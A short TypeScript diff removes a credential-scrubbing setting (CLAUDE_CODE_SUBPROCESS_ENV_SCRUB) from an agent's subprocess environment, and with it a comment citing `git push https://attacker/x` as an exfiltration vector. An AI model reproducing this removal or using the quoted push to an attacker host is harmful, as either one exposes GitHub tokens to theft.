@@ -125,11 +125,6 @@ export function buildProviderEnv(
   const baseEnv: Record<string, string | undefined> = Object.fromEntries(
     Object.entries(process.env).filter(([key, value]) => isEnvKeyAllowed(key) && !isBlank(value)),
   );
-  // Defense-in-depth: scrub credentials from grandchild subprocesses spawned
-  // by the agent's Bash tool — protects against `git push https://attacker/x`
-  // type exfiltration vectors via env inheritance through the second hop.
-  // See Anthropic Claude Code env-var docs (CLAUDE_CODE_SUBPROCESS_ENV_SCRUB).
-  baseEnv["CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"] = "1";
   const tokenEnv: Record<string, string> =
     installationToken !== undefined && installationToken !== ""
       ? { GH_TOKEN: installationToken, GITHUB_TOKEN: installationToken }
